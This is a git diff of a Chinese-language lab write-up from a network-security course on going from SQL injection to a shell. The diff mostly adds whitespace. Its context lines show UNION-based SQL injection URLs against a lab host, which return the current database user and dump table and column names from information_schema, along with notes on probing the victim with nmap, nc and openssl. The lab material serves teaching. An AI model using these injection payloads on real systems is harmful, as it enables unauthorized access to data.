@@ -71,6 +71,7 @@ Nmap done: 1 IP address (1 host up) scanned in 0.22 seconds
  
 
 
+
      由上面的返回信息可以看到，我们可以获取server端 apache、php的`版本信息`。
 
    由上面的扫描结果可知，`443/tcp`端口并未开放，所以我们只能通过 HTTP的方式访问victim，如果victim只能通过HTTPS的方式进行访问，telent/natcat 就不能用于与 victim 通信，此时我们可以使用工具 `openssl` 访问victim(nc -nvlp 443 可以开启 443/https 服务)。
@@ -248,6 +249,7 @@ Requests/sec.: 688.6203
  
 
 
+
 2.当前用户     `http://vulnerable/cat.php?id=1 UNION SELECT 1, current_user(),3,4`
 ​       ![8](https://github.com/CUCCS/2018-NS-Public-jackcily/raw/Ns_chap0x07_%E4%BB%8ESQL%E6%B3%A8%E5%85%A5%E5%88%B0Shell/img/8.PNG)
 ​        
@@ -282,9 +284,14 @@ Requests/sec.: 688.6203
 ​        ![12](https://github.com/CUCCS/2018-NS-Public-jackcily/raw/Ns_chap0x07_%E4%BB%8ESQL%E6%B3%A8%E5%85%A5%E5%88%B0Shell/img/12.PNG)
 ​        
 
+
+
 4.同时输出列和列对应的表名称：  `http://vulnerable/cat.php?id=1 UNION SELECT 1,concat(table_name ,':',column_name),3,4 FROM information_schema.columns`
-​      ![13](https://github.com/CUCCS/2018-NS-Public-jackcily/raw/Ns_chap0x07_%E4%BB%8ESQL%E6%B3%A8%E5%85%A5%E5%88%B0Shell/img/13.PNG)
+​   
+
+   ![13](https://github.com/CUCCS/2018-NS-Public-jackcily/raw/Ns_chap0x07_%E4%BB%8ESQL%E6%B3%A8%E5%85%A5%E5%88%B0Shell/img/13.PNG)
 ​      
+
 ----------------------
    **注意**：
    如果想使用正则匹配对结果进行提取，可以在输出信息中加入标记。
